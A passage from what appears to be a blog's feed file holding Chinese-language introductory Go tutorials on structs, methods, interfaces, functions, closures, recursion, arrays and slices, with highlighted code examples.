<span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="type">string</span></span><br><span class="line">age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 使用这个语法创建了一个新的结构体元素。</span></span><br><span class="line">fmt.Println(person&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">20</span>&#125;)</span><br><span class="line"><span class="comment">// 你可以在初始化一个结构体元素时指定字段名字。</span></span><br><span class="line">fmt.Println(person&#123;name: <span class="string">&quot;Alice&quot;</span>, age: <span class="number">30</span>&#125;)</span><br><span class="line"><span class="comment">// 省略的字段将被初始化为零值。</span></span><br><span class="line">fmt.Println(person&#123;name: <span class="string">&quot;Fred&quot;</span>&#125;)</span><br><span class="line"><span class="comment">// &amp; 前缀生成一个结构体指针。</span></span><br><span class="line">fmt.Println(&amp;person&#123;name: <span class="string">&quot;Ann&quot;</span>, age: <span class="number">40</span>&#125;)</span><br><span class="line"><span class="comment">// 使用点来访问结构体字段。</span></span><br><span class="line">s := person&#123;name: <span class="string">&quot;Sean&quot;</span>, age: <span class="number">50</span>&#125;</span><br><span class="line">fmt.Println(s.name)</span><br><span class="line"><span class="comment">// 也可以对结构体指针使用. - 指针会被自动解引用。</span></span><br><span class="line">sp := &amp;s</span><br><span class="line">fmt.Println(sp.age)</span><br><span class="line"><span class="comment">// 结构体是可变的。</span></span><br><span class="line">sp.age = <span class="number">51</span></span><br><span class="line">fmt.Println(sp.age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、结构体方法"><a href="#六、结构体方法" class="headerlink" title="六、结构体方法"></a>六、结构体方法</h2><p>结构体即为对象，对象的行为可以称之为方法；比如人可以走，手、脚为人的属性，走位人的方法；我们看下面形状的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">width, height <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的 area 方法有一个接收器类型 rect。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *rectangle)</span></span> area() <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以为值类型或者指针类型的接收器定义方法。这里是一个值类型接收器的例子。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rectangle)</span></span> perim() <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*r.width + <span class="number">2</span>*r.height</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := rectangle&#123;width: <span class="number">10</span>, height: <span class="number">5</span>&#125;</span><br><span class="line"><span class="comment">// 这里我们调用上面为结构体定义的两个方法。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;area: &quot;</span>, r.area())</span><br><span class="line">fmt.Println(<span class="string">&quot;perim:&quot;</span>, r.perim())</span><br><span class="line"><span class="comment">// Go 自动处理方法调用时的值和指针之间的转化。</span></span><br><span class="line"><span class="comment">// 你可以使用指针来调用方法来避免在方法调用时产生一个拷贝，或者让方法能够改变接受的数据。</span></span><br><span class="line">rp := &amp;r</span><br><span class="line">fmt.Println(<span class="string">&quot;area: &quot;</span>, rp.area())</span><br><span class="line">fmt.Println(<span class="string">&quot;perim:&quot;</span>, rp.perim())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七、接口定义"><a href="#七、接口定义" class="headerlink" title="七、接口定义"></a>七、接口定义</h2><p>Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。</p><p>接口其实就是物体抽象的定义，实际用才会有体会，示例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是一个几何体的基本接口。</span></span><br><span class="line"><span class="keyword">type</span> geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">area() <span class="type">float64</span></span><br><span class="line">perim() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在我们的例子中，我们将让 rect 和 circle 实现这个接口</span></span><br><span class="line"><span class="keyword">type</span> rect <span class="keyword">struct</span> &#123;</span><br><span class="line">width, height <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> circle <span class="keyword">struct</span> &#123;</span><br><span class="line">radius <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要在 Go 中实现一个接口，我们只需要实现接口中的所有方法。</span></span><br><span class="line"><span class="comment">// 这里我们让 rect 实现了 geometry 接口。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span></span> perim() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*r.width + <span class="number">2</span>*r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// circle 的实现。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span></span> perim() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果一个变量的是接口类型，那么我们可以调用这个被命名的接口中的方法。</span></span><br><span class="line"><span class="comment">// 这里有一个一通用的 measure 函数，利用这个特性，它可以用在任何 geometry 上。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">measure</span><span class="params">(g geometry)</span></span> &#123;</span><br><span class="line">fmt.Println(g)</span><br><span class="line">fmt.Println(g.area())</span><br><span class="line">fmt.Println(g.perim())</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := rect&#123;width: <span class="number">3</span>, height: <span class="number">4</span>&#125;</span><br><span class="line">c := circle&#123;radius: <span class="number">5</span>&#125;</span><br><span class="line"><span class="comment">// 结构体类型 circle 和 rect 都实现了 geometry接口，</span></span><br><span class="line"><span class="comment">// 所以我们可以使用它们的实例作为 measure 的参数。</span></span><br><span class="line">measure(r)</span><br><span class="line">measure(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang函数介绍</title>
      <link href="/2025/03/04/golang%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D/"/>
      <url>/2025/03/04/golang%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="golang函数介绍"><a href="#golang函数介绍" class="headerlink" title="golang函数介绍"></a>golang函数介绍</h1><p>函数是基本的代码块，用于执行一个任务。</p><p>Go 语言最少有个 main() 函数。</p><p>你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。</p><p>函数声明告诉了编译器函数的名称，返回类型，和参数。</p><p>Go 语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度，如果传入的是数组，则返回数组中包含的元素个数。</p><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><p>Go 语言函数定义格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func function_name( [parameter list] ) [return_types] &#123;</span><br><span class="line">   函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数定义解析：</p><ul><li>func：函数由 func 开始声明</li><li>function_name：函数名称，函数名和参数列表一起构成了函数签名。</li><li>parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。</li><li>return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。</li><li>函数体：函数定义的代码集合。</li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// hello world</span></span><br><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 加法</span></span><br><span class="line">res := plus(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;1+2 =&quot;</span>, res)</span><br><span class="line">res = plusPlus(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;1+2+3 =&quot;</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 多值返回</span></span><br><span class="line"><span class="comment">// 这里我们通过多赋值 操作来使用这两个不同的返回值。</span></span><br><span class="line">a, b := vals()</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line"><span class="comment">// 如果你仅仅想返回值的一部分的话，你可以使用空白定义符 _。</span></span><br><span class="line">_, c := vals()</span><br><span class="line">fmt.Println(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 可变参数</span></span><br><span class="line"><span class="comment">// 变参函数使用常规的调用方式，除了参数比较特殊。</span></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 如果你的 slice 已经有了多个值，想把它们作为变参使用，你要这样调用 func(slice...)。</span></span><br><span class="line">nums := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">sum(nums...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 闭包</span></span><br><span class="line"><span class="comment">// 我们调用 intSeq 函数，将返回值（也是一个函数）赋给nextInt。</span></span><br><span class="line"><span class="comment">// 这个函数的值包含了自己的值 i，这样在每次调用 nextInt 时都会更新 i 的值。</span></span><br><span class="line">nextInt := intSeq()</span><br><span class="line"><span class="comment">// 通过多次调用 nextInt 来看看闭包的效果。</span></span><br><span class="line">fmt.Println(nextInt())</span><br><span class="line">fmt.Println(nextInt())</span><br><span class="line">fmt.Println(nextInt())</span><br><span class="line"><span class="comment">// 为了确认这个状态对于这个特定的函数是唯一的，我们重新创建并测试一下。</span></span><br><span class="line">newInts := intSeq()</span><br><span class="line">fmt.Println(newInts())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 递归</span></span><br><span class="line">fmt.Println(fact(<span class="number">7</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 这里是一个函数，接受两个 int 并且以 int 返回它们的和</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">plus</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="comment">// Go 需要明确的返回值，例如，它不会自动返回最后一个表达式的值</span></span><br><span class="line"><span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (int, int) 在这个函数中标志着这个函数返回 2 个 int。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">plusPlus</span><span class="params">(a, b, c <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b + c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多返回值函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">vals</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>, <span class="number">7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变参函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums ...<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Print(nums, <span class="string">&quot; &quot;</span>)</span><br><span class="line">total := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">total += num</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包</span></span><br><span class="line"><span class="comment">// 这个 intSeq 函数返回另一个在 intSeq 函数体内定义的匿名函数。</span></span><br><span class="line"><span class="comment">// 这个返回的函数使用闭包的方式 隐藏 变量 i。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intSeq</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="comment">// face 函数在到达 face(0) 前一直调用自身。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fact</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang常用数据类型</title>
      <link href="/2025/03/04/golang%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2025/03/04/golang%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="golang常用数据类型"><a href="#golang常用数据类型" class="headerlink" title="golang常用数据类型"></a>golang常用数据类型</h1><h2 id="一、常用数据类型介绍"><a href="#一、常用数据类型介绍" class="headerlink" title="一、常用数据类型介绍"></a>一、常用数据类型介绍</h2><p>Go 语言提供了数组，切片Slice，集合Map以及循环遍历Range;</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。</p><h3 id="切片-Slice"><a href="#切片-Slice" class="headerlink" title="切片(Slice)"></a>切片(Slice)</h3><p>Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。</p><h3 id="集合-Map"><a href="#集合-Map" class="headerlink" title="集合(Map)"></a>集合(Map)</h3><p>Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。</p><h3 id="循环遍历-Range"><a href="#循环遍历-Range" class="headerlink" title="循环遍历(Range)"></a>循环遍历(Range)</h3><p>Go 语言中 range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对。</p><h2 id="二、示例"><a href="#二、示例" class="headerlink" title="二、示例"></a>二、示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// hello world</span></span><br><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### arrays&quot;</span>)</span><br><span class="line">arrays()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### slice&quot;</span>)</span><br><span class="line">slice()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### mapFunc&quot;</span>)</span><br><span class="line">mapFunc()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### rangeFunc&quot;</span>)</span><br><span class="line">rangeFunc()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">arrays</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里我们创建了一个数组 test1 来存放刚好 5 个 int。</span></span><br><span class="line"><span class="comment">// 元素的类型和长度都是数组类型的一部分。</span></span><br><span class="line"><span class="comment">// 数组默认是零值的，对于 int 数组来说也就是 0。</span></span><br><span class="line"><span class="keyword">var</span> test1 [<span class="number">6</span>]<span class="type">int</span></span><br><span class="line">fmt.Println(<span class="string">&quot;内容:&quot;</span>, test1)</span><br><span class="line"><span class="comment">// 我们可以使用 array[index] = value 语法来设置数组指定位置的值，或者用 array[index] 得到值。</span></span><br><span class="line">test1[<span class="number">4</span>] = <span class="number">100</span></span><br><span class="line">fmt.Println(<span class="string">&quot;设置:&quot;</span>, test1)</span><br><span class="line">fmt.Println(<span class="string">&quot;获取:&quot;</span>, test1[<span class="number">4</span>])</span><br><span class="line"><span class="comment">// 使用内置函数 len 返回数组的长度</span></span><br><span class="line">fmt.Println(<span class="string">&quot;长度:&quot;</span>, <span class="built_in">len</span>(test1))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用这个语法在一行内初始化一个数组</span></span><br><span class="line">test2 := [<span class="number">6</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, test2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组的存储类型是单一的，但是你可以组合这些数据来构造多维的数据结构。</span></span><br><span class="line"><span class="keyword">var</span> twoTest [<span class="number">3</span>][<span class="number">4</span>]<span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">4</span>; j++ &#123;</span><br><span class="line">twoTest[i][j] = i + j</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意，在使用 fmt.Println 来打印数组的时候，会使用[v1 v2 v3 ...] 的格式显示</span></span><br><span class="line">fmt.Println(<span class="string">&quot;二维: &quot;</span>, twoTest)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切片</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">slice</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Slice 是 Go 中一个关键的数据类型，是一个比数组更加强大的序列接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不像数组，slice 的类型仅由它所包含的元素决定（不像数组中还需要元素的个数）。</span></span><br><span class="line"><span class="comment">// 要创建一个长度非零的空slice，需要使用内建的方法 make。</span></span><br><span class="line"><span class="comment">// 这里我们创建了一个长度为3的 string 类型 slice（初始化为零值）。</span></span><br><span class="line">test1 := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">3</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, test1)</span><br><span class="line"><span class="comment">// 我们可以和数组一样设置和得到值</span></span><br><span class="line">test1[<span class="number">0</span>] = <span class="string">&quot;A&quot;</span></span><br><span class="line">test1[<span class="number">1</span>] = <span class="string">&quot;C&quot;</span></span><br><span class="line">test1[<span class="number">2</span>] = <span class="string">&quot;B&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, test1)</span><br><span class="line">fmt.Println(<span class="string">&quot;获取:&quot;</span>, test1[<span class="number">2</span>])</span><br><span class="line"><span class="comment">// 如你所料，len 返回 slice 的长度</span></span><br><span 